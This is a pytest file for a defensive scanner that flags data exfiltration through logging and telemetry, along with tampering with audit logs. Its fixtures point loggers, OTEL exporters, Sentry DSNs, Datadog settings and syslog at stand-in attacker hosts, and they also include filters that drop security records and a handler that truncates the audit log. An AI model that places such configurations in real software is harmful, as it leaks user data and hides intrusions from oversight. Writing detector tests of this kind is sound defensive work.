"""Tests for scripts/lib/log_telemetry_patterns.py.

Pattern-coverage tests for the log/telemetry exfil + audit-evasion
catalogue (Wave 17, impl-cc). Every rule has at least one positive test
and 1-2 negative tests. The scanner is exercised end-to-end through
scan_text() — the public surface.
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import log_telemetry_patterns as ltp  # type: ignore[import-not-found]  # noqa: E402

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_is_frozen_ordered() -> None:
    """RULES must be a tuple (immutable) and contain every advertised rule id."""
    assert isinstance(ltp.RULES, tuple)
    rule_ids = {r.id for r in ltp.RULES}
    expected = {
        "log-channel.url-shape-in-log-field",
        "log-channel.otel-exporter-non-allowlisted",
        "log-channel.sentry-dsn-non-allowlisted",
        "log-channel.observability-agent-env-non-allowlisted",
        "log-channel.crlf-injection-in-log-field",
        "log-channel.audit-log-truncation",
        "log-channel.syslog-udp-non-allowlisted",
        "log-channel.logging-filter-suppresses-security",
    }
    assert expected.issubset(rule_ids), expected - rule_ids


def test_every_rule_has_owasp_mapping() -> None:
    """Every Rule must declare a non-empty OWASP-ASI mapping and a
    catalogue-conformant severity string."""
    for rule in ltp.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in {"CRITICAL", "HIGH", "MEDIUM", "LOW"}, rule.id


def test_finding_named_tuple_shape() -> None:
    """Finding is a NamedTuple with the exact field set the heartbeat
    detector expects (same shape as agent_config_patterns.Finding)."""
    f = ltp.Finding(
        rule_id="r", line=1, column=2, matched_text="m",
        severity="HIGH", description="d", owasp_asi="ASI-02",
    )
    assert f.rule_id == "r"
    assert f.line == 1
    assert f.column == 2
    assert f.severity == "HIGH"
    assert f.owasp_asi == "ASI-02"


def test_scan_empty_text() -> None:
    """Empty text yields zero findings (no exception, no crash)."""
    assert ltp.scan_text("") == []


# ---------- helper -------------------------------------------------------


def _ids(findings: list) -> set[str]:
    return {f.rule_id for f in findings}


# ---------- Rule 1: URL smuggle inside logger call -----------------------


def test_log_url_smuggle_positive() -> None:
    """logger.info containing an HTTPS URL with query string pointing at
    a non-loopback host must fire."""
    src = (
        "logger.info("
        "f'session: https://attacker.example/track?uid={user.id}&email={email}'"
        ")\n"
    )
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.url-shape-in-log-field" in fired, fired


def test_log_url_smuggle_negative_no_query() -> None:
    """A plain URL without a query string is just documentation — must NOT
    fire (the smuggle vector requires query parameters)."""
    src = "logger.warning(f'upstream timeout reaching https://example.com/api')\n"
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.url-shape-in-log-field" not in fired, fired


def test_log_url_smuggle_negative_loopback() -> None:
    """A URL at localhost / 127.0.0.1 is not exfil — must NOT fire."""
    src = "logger.info(f'local dev hit http://localhost:8080/track?uid=1')\n"
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.url-shape-in-log-field" not in fired, fired


# ---------- Rule 2: OTEL exporter to attacker host -----------------------


def test_otel_exporter_attacker_endpoint_positive() -> None:
    """OTLPSpanExporter(endpoint='https://attacker.example/v1/traces')
    must fire — host not on the vendor allowlist."""
    src = (
        "exporter = OTLPSpanExporter("
        "endpoint='https://attacker.example/v1/traces')\n"
    )
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.otel-exporter-non-allowlisted" in fired, fired


def test_otel_env_var_attacker_positive() -> None:
    """OTEL_EXPORTER_OTLP_ENDPOINT=https://attacker.example in env / compose
    file must fire."""
    src = "OTEL_EXPORTER_OTLP_ENDPOINT=https://attacker.example:4317\n"
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.otel-exporter-non-allowlisted" in fired, fired


def test_otel_exporter_vendor_negative() -> None:
    """Endpoint pointing at a Honeycomb / Datadog / Lightstep host must
    NOT fire (those are on the SaaS-vendor allowlist)."""
    src = (
        "exporter = OTLPSpanExporter("
        "endpoint='https://api.honeycomb.io/v1/traces')\n"
    )
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.otel-exporter-non-allowlisted" not in fired, fired


def test_otel_exporter_localhost_negative() -> None:
    """Endpoint on localhost is in-cluster, not exfil — must NOT fire."""
    src = (
        "OTEL_EXPORTER_OTLP_ENDPOINT=http://localhost:4317\n"
    )
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.otel-exporter-non-allowlisted" not in fired, fired


# ---------- Rule 3: Sentry DSN drift -------------------------------------


def test_sentry_dsn_attacker_host_positive() -> None:
    """sentry_sdk.init(dsn='https://abc@attacker.example/1') must fire —
    host is neither sentry.io nor loopback."""
    src = (
        "sentry_sdk.init("
        "dsn='https://abcdef0123456789@attacker.example/12345')\n"
    )
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.sentry-dsn-non-allowlisted" in fired, fired


def test_sentry_dsn_env_attacker_positive() -> None:
    """SENTRY_DSN env var pointing at attacker host must fire."""
    src = "SENTRY_DSN=https://abc123@evil.example.org/42\n"
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.sentry-dsn-non-allowlisted" in fired, fired


def test_sentry_dsn_vendor_negative() -> None:
    """DSN at o0123.ingest.us.sentry.io is a legitimate Sentry tenant
    endpoint — must NOT fire."""
    src = (
        "sentry_sdk.init("
        "dsn='https://abc123@o0123.ingest.us.sentry.io/99')\n"
    )
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.sentry-dsn-non-allowlisted" not in fired, fired


# ---------- Rule 4: Datadog / New Relic env vars -------------------------


def test_dd_agent_attacker_url_positive() -> None:
    """DD_TRACE_AGENT_URL pointing at attacker.example must fire."""
    src = "DD_TRACE_AGENT_URL=http://attacker.example:8126\n"
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.observability-agent-env-non-allowlisted" in fired, fired


def test_new_relic_attacker_host_positive() -> None:
    """NEW_RELIC_HOST pointing at attacker host must fire."""
    src = "NEW_RELIC_HOST=attacker.example.com\n"
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.observability-agent-env-non-allowlisted" in fired, fired


def test_dd_agent_legitimate_negative() -> None:
    """DD_SITE=datadoghq.com is the canonical SaaS endpoint — must NOT fire."""
    src = "DD_SITE=datadoghq.com\n"
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.observability-agent-env-non-allowlisted" not in fired, fired


def test_new_relic_localhost_negative() -> None:
    """NEW_RELIC_HOST=localhost is dev / in-cluster — must NOT fire."""
    src = "NEW_RELIC_HOST=localhost\n"
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.observability-agent-env-non-allowlisted" not in fired, fired


# ---------- Rule 5: CRLF injection in log field --------------------------


def test_log_crlf_literal_positive() -> None:
    """Logger call containing literal \\r\\n in the argument must fire."""
    src = r'logger.info("user=admin\r\nstatus=login_ok")' + "\n"
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.crlf-injection-in-log-field" in fired, fired


def test_log_user_input_no_sanitiser_positive() -> None:
    """logger.info(f'user={request.args[\"u\"]}') with no .replace() / no
    sanitiser must fire (taint flow into log)."""
    src = "logger.info(f'login attempt user={request.args[\"u\"]}')\n"
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.crlf-injection-in-log-field" in fired, fired


def test_log_user_input_sanitised_negative() -> None:
    """logger.info with .replace('\\r\\n', '') sanitisation must NOT fire."""
    src = (
        "logger.info(f'user={request.args[\"u\"].replace(chr(10), \"\")}')\n"
    )
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.crlf-injection-in-log-field" not in fired, fired


# ---------- Rule 6: RotatingFileHandler truncation ----------------------


def test_rotating_truncate_positive() -> None:
    """RotatingFileHandler with backupCount=0 must fire (truncates on
    rollover, destroys audit trail)."""
    src = (
        "handler = RotatingFileHandler("
        "'audit.log', maxBytes=1024*1024, backupCount=0)\n"
    )
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.audit-log-truncation" in fired, fired


def test_rotating_with_backup_negative() -> None:
    """RotatingFileHandler with backupCount=5 retains rolled-over files —
    must NOT fire."""
    src = (
        "handler = RotatingFileHandler("
        "'audit.log', maxBytes=1024*1024, backupCount=5)\n"
    )
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.audit-log-truncation" not in fired, fired


# ---------- Rule 7: SysLogHandler UDP to attacker host -------------------


def test_syslog_udp_attacker_positive() -> None:
    """SysLogHandler(address=('attacker.example', 514)) defaults to UDP +
    non-loopback host — must fire."""
    src = (
        "handler = SysLogHandler("
        "address=('attacker.example', 514))\n"
    )
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.syslog-udp-non-allowlisted" in fired, fired


def test_syslog_loopback_negative() -> None:
    """SysLogHandler(address=('localhost', 514)) is in-host / dev — must
    NOT fire."""
    src = "handler = SysLogHandler(address=('localhost', 514))\n"
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.syslog-udp-non-allowlisted" not in fired, fired


def test_syslog_tcp_explicit_negative() -> None:
    """SysLogHandler with explicit socktype=socket.SOCK_STREAM is TCP —
    must NOT fire (the rule targets UDP-default + UDP-explicit)."""
    src = (
        "handler = SysLogHandler("
        "address=('logs.example.com', 514), "
        "socktype=socket.SOCK_STREAM)\n"
    )
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.syslog-udp-non-allowlisted" not in fired, fired


# ---------- Rule 8: logging.Filter security-suppression ------------------


def test_logging_filter_suppresses_security_positive() -> None:
    """A logging.Filter subclass whose filter() returns False on records
    mentioning 'security' must fire."""
    src = (
        "class SilentFilter(logging.Filter):\n"
        "    def filter(self, record):\n"
        "        if 'security violation' in record.getMessage():\n"
        "            return False\n"
        "        return True\n"
    )
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.logging-filter-suppresses-security" in fired, fired


def test_logging_filter_unauthorised_keyword_positive() -> None:
    """Filter dropping 'unauthorized' records must fire — the keyword
    set covers the unauth* prefix."""
    src = (
        "class XFilter(Filter):\n"
        "    def filter(self, record):\n"
        "        if 'unauthorized' in record.msg:\n"
        "            return False\n"
        "        return True\n"
    )
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.logging-filter-suppresses-security" in fired, fired


def test_logging_filter_no_security_keyword_negative() -> None:
    """A filter that drops 'debug noise' records (no security keyword) —
    must NOT fire. This is a legitimate noise-reduction filter."""
    src = (
        "class NoiseFilter(logging.Filter):\n"
        "    def filter(self, record):\n"
        "        if 'heartbeat ping' in record.getMessage():\n"
        "            return False\n"
        "        return True\n"
    )
    fired = _ids(ltp.scan_text(src))
    assert "log-channel.logging-filter-suppresses-security" not in fired, fired


# ---------- helper-function unit tests -----------------------------------


def test_host_allowlist_exact() -> None:
    """_host_is_allowlisted matches exact entries."""
    assert ltp._host_is_allowlisted(
        "localhost",
        exact=ltp._OTEL_ENDPOINT_ALLOWLIST,
        suffixes=ltp._OTEL_ENDPOINT_WILDCARD_SUFFIXES,
    )


def test_host_allowlist_wildcard_suffix() -> None:
    """_host_is_allowlisted matches a wildcard suffix entry."""
    assert ltp._host_is_allowlisted(
        "api.honeycomb.io",
        exact=ltp._OTEL_ENDPOINT_ALLOWLIST,
        suffixes=ltp._OTEL_ENDPOINT_WILDCARD_SUFFIXES,
    )


def test_host_allowlist_negative() -> None:
    """_host_is_allowlisted rejects an unrelated host."""
    assert not ltp._host_is_allowlisted(
        "attacker.example",
        exact=ltp._OTEL_ENDPOINT_ALLOWLIST,
        suffixes=ltp._OTEL_ENDPOINT_WILDCARD_SUFFIXES,
    )


def test_extract_sentry_host_from_match() -> None:
    """_extract_sentry_host pulls the host segment out of a DSN string."""
    assert ltp._extract_sentry_host(
        "dsn='https://abc123@attacker.example/42'"
    ) == "attacker.example"


def test_filter_body_security_keyword_match() -> None:
    """_filter_body_mentions_security catches 'audit' substring."""
    assert ltp._filter_body_mentions_security(
        "class F(Filter):\n    def filter(self, r):\n"
        "        if 'audit' in r.msg: return False"
    )


def test_filter_body_security_keyword_no_match() -> None:
    """_filter_body_mentions_security returns False on a benign body."""
    assert not ltp._filter_body_mentions_security(
        "class F(Filter):\n    def filter(self, r):\n"
        "        if 'spam' in r.msg: return False"
    )
